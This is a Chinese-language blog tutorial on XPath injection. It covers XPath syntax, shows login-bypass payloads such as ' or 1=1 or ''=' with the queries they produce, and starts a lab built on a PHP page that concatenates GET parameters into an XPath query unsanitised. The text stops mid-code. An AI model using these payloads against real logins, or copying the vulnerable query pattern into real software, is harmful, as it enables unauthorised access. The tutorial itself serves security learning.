1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">浅析Xpath注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-08-06T07:40:19.057Z" title="发表于 2023-08-06 15:40:19">2023-08-06</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-08-06T07:50:29.621Z" title="更新于 2023-08-06 15:50:29">2023-08-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">8.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="浅析Xpath注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/08/06/qian-xi-xpath-zhu-ru/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/08/06/qian-xi-xpath-zhu-ru/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/"><header><a class="post-meta-categories" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" itemprop="url">常见top漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">浅析Xpath注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-08-06T07:40:19.057Z" title="发表于 2023-08-06 15:40:19">2023-08-06</time><time itemprop="dateCreated datePublished" datetime="2023-08-06T07:50:29.621Z" title="更新于 2023-08-06 15:50:29">2023-08-06</time></header><h1 id="xpath注入总结">Xpath注入总结</h1>
<h2 id="0x01-什么是xpath">0x01 什么是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Xpath&amp;spm=1001.2101.3001.7020">Xpath</a></h2>
<p>XPath 即为 XML 路径语言，是 W3C  XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。它是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言,后来独立成了一种W3C标准。<br>
XPath 基于 XML 的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力，可用来在 XML 文档中对元素和属性进行遍历。<br>
XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p>
<p>**一句话总结：**XPath的作用就是用于在XML或HTML中查找信息，就像SQL语句的作用是在数据库中查询信息一样。</p>
<h2 id="0x02-xpath的简单演示">0x02 Xpath的简单演示</h2>
<pre><code class="hljs plaintext">Xpath语法的简单展示:

    在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或成为根节点）。

    nodename：选取此节点的所有节点

    /： 从根节点选取

    //：表示选取所有的子元素，不考虑其在文档的位置

    .： 选取当前节点

    ..：选取当前节点的父节点

    @：选取属性 或@*: 匹配任何属性节点 
    
    *: 匹配任何元素节点

    函数：

    starts-with 匹配一个属性开始位置的关键字

    contains 匹配一个属性值中包含的字符串

    text（） 匹配的是显示文本信息</code></pre>
<pre><code class="hljs Xml">//代码示例:

<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> ?&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">students</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">student</span> <span class="hljs-attr">number</span>=<span class="hljs-string">"1"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">name</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"zs"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">xing</span>&gt;</span>张<span class="hljs-tag">&lt;/<span class="hljs-name">xing</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ming</span>&gt;</span>三<span class="hljs-tag">&lt;/<span class="hljs-name">ming</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>male<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">student</span> <span class="hljs-attr">number</span>=<span class="hljs-string">"2"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">name</span> <span class="hljs-attr">id</span> = <span class="hljs-string">"ls"</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">age</span>&gt;</span>24<span class="hljs-tag">&lt;/<span class="hljs-name">age</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">sex</span>&gt;</span>female<span class="hljs-tag">&lt;/<span class="hljs-name">sex</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">student</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">students</span>&gt;</span>

//这里根节点是<span class="hljs-tag">&lt;<span class="hljs-name">students</span>&gt;</span>
//像<span class="hljs-tag">&lt;<span class="hljs-name">xing</span>&gt;</span>或者<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>这些都可以叫元素节点
//id="zs"这些事属性节点</code></pre>
<p>上边是一个简单的XML文档，那么接下来用<code>Xpath</code>来查语句（这里用python语言举例，但这里不知为何，我的python运行不了，可能版本不匹配了）</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree

xml =<span class="hljs-string">'''</span>
<span class="hljs-string">  &lt;students&gt;</span>
<span class="hljs-string">    &lt;student number="1"&gt;</span>
<span class="hljs-string">        &lt;name id="zs"&gt;</span>
<span class="hljs-string">            &lt;xing&gt;张&lt;/xing&gt;</span>
<span class="hljs-string">            &lt;ming&gt;三&lt;/ming&gt;</span>
<span class="hljs-string">        &lt;/name&gt;</span>
<span class="hljs-string">        &lt;age&gt;18&lt;/age&gt;</span>
<span class="hljs-string">        &lt;sex&gt;male&lt;/sex&gt;</span>
<span class="hljs-string">    &lt;/student&gt;</span>
<span class="hljs-string">    &lt;student number="2"&gt;</span>
<span class="hljs-string">        &lt;name id = "ls"&gt;李四&lt;/name&gt;</span>
<span class="hljs-string">        &lt;age&gt;24&lt;/age&gt;</span>
<span class="hljs-string">        &lt;sex&gt;female&lt;/sex&gt;</span>
<span class="hljs-string">    &lt;/student&gt;</span>
<span class="hljs-string"></span>
<span class="hljs-string">&lt;/students&gt;</span>
<span class="hljs-string">'''</span>
tree = etree.XML(xml)
<span class="hljs-comment">#选所有students，选第一个值-&gt;students-&gt;student-&gt;name-&gt;xing的文本</span>
out = tree.xpath(<span class="hljs-string">'//students'</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].text
<span class="hljs-built_in">print</span>(out)
<span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------------------------------'</span>)
<span class="hljs-comment">#所有name元素，第二个也就是李四那个,选它的文本</span>
out = tree.xpath(<span class="hljs-string">'//name'</span>)[<span class="hljs-number">1</span>].text
<span class="hljs-built_in">print</span>(out)
out = tree.xpath(<span class="hljs-string">'//name'</span>)[<span class="hljs-number">1</span>].xpath(<span class="hljs-string">'@id'</span>)
<span class="hljs-built_in">print</span>(out)</code></pre>
<p>以下 是大佬的成功展示案例(通过这里我们可以体会到类似于sql查询的感觉)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="%E6%B5%85%E6%9E%90Xpath%E6%B3%A8%E5%85%A5//image-20230505093730981.png" alt="image-20230505093730981"></p>
<h2 id="0x03-xpath基础语法">0x03 Xpath基础语法</h2>
<p><strong>(1)查询基本语句</strong></p>
<pre><code class="hljs plaintext">//users/user[loginID/text()=’abc’ and password/text()=’test123’] 。</code></pre>
<p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1  就能绕过校验，成功获取所有user数据。</p>
<pre><code class="hljs plaintext">//users/user[LoginID/text()=''or 1=1 and password/text()=''or 1=1]</code></pre>
<p><strong>(2)节点类型</strong></p>
<p>在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或称为根节点）。 文档的根节点即是文档结点；对应属性有属性结点，元素有元素结点。</p>
<ul>
<li>element (元素)</li>
<li>attribute (属性)</li>
<li>text (文本)</li>
<li>namespace (命名空间)</li>
<li>processing-instruction (处理指令)</li>
<li>comment (注释)</li>
<li>root (根节点)</li>
</ul>
<p>例如下面的XML文档</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"ISO-8859-1"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>Harry Potter<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>J K. Rowling<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>2005<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>29.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>
&lt;/bookstore</code></pre>
<pre><code class="hljs plaintext">&lt;bookstore&gt;       根节点
&lt;author&gt;J K. Rowling&lt;/author&gt;    元素节点
lang="en"     属性节点</code></pre>
<p>下面是一个匹配节点的实例</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"ISO-8859-1"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"eng"</span>&gt;</span>Harry Potter<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>29.99<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"eng"</span>&gt;</span>Learning XML<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>39.95<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span></code></pre>
<p>路径表达式结果</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505094543078.png" alt="image-20230505094543078"></p>
<p><strong>(4)限定语</strong></p>
<p>限定语是对路径表达式的附加条件,用来查找某个特定的节点或者包含某个指定的值的节点.限定语被嵌在方括号中，路径表达式结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505100231637.png" alt="image-20230505100231637"></p>
<p><strong>(5)通配符</strong></p>
<p>XPath 通配符可用来选取未知的 XML 元素.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505100650165.png" alt="image-20230505100650165"></p>
<p>实例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230505100717551.png" alt="image-20230505100717551"></p>
<p>更多细节参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/99440887?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168320378516782427481230%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168320378516782427481230&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-99440887-null-null.142%5Ev86%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&amp;utm_term=XPth%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3&amp;spm=1018.2226.3001.4187">Xpa`th注入</a></p>
<h2 id="0x04xpath注入的定义"><strong>0x04XPath注入的定义</strong></h2>
<p>​		XPath注入攻击，是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath  查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。Xpath注入攻击本质上和<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">SQL注入</a>攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击。</p>
<p>​		XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p>
<h2 id="0x05-xpath注入原理">0x05 xpath注入原理</h2>
<p>​		xpath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，**但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件。**攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 XML  数据被用于用户认证，那么攻击者就可以提升他的权限。</p>
<p>​		因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML  中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个  XML 文档。 注入出现的位置也就是cookie，headers，request  parameters/input等。下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。</p>
<p>​		在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password）  两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名  （username）和密码（password）的结果来进行授权访问。</p>
<p>例存在user.xml文件如下：</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Ben<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Elmore<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">loginID</span>&gt;</span>abc<span class="hljs-tag">&lt;/<span class="hljs-name">loginID</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Shlomy<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Gantz<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">loginID</span>&gt;</span>xyz<span class="hljs-tag">&lt;/<span class="hljs-name">loginID</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123test<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre>
<p>则在XPath中其典型的查询语句如下：</p>
<pre><code class="hljs plaintext">//users/user[loginID/text()='xyz'and password/text()='123test']</code></pre>
<p>但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID =  ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ’ or 1=1 or ‘’=’  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：</p>
<pre><code class="hljs plaintext">//users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''='']</code></pre>
<p>​		这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML  文档。攻击完成登录可以再通过XPath注入技术获取最高权限帐号和其它重要文档信息。延展开来，<strong>xpath的注入还有很多花样，像是通过updataxml()函数实现xpth报错注入，还有xpth的盲注。</strong></p>
<h2 id="0x06-下面动手实操以下都是跟着佬做的">0x06 下面动手实操(以下都是跟着佬做的)</h2>
<h3 id="xpath实例1">Xpath实例1</h3>
<p>主流脚本语言都支持对XPath的处理,下面我以PHP来学习XPath注入的原理：</p>
<p><strong>blog.xml</strong></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"md5"</span>&gt;</span>0192023a7bbd73250516f069df18b500<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>jack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"md5"</span>&gt;</span>1d6c1e168e362bc0092f247399003a88<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>tony<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"md5"</span>&gt;</span>cc20f43c8c24dbc0b2539489b113277a<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">secret</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">flag</span>&gt;</span>flag{My_f1rst_xp4th_iNjecti0n}<span class="hljs-tag">&lt;/<span class="hljs-name">flag</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">secret</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></code></pre>
<p><strong>index.php</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">'blog.xml'</span>);
<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
<span class="hljs-variable">$pwd</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pwd'</span>]);
<span class="hljs-variable">$query</span>= <span class="hljs-string">"/root/users/user[username/text()='"</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">"' and password/text()='"</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">"']"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;
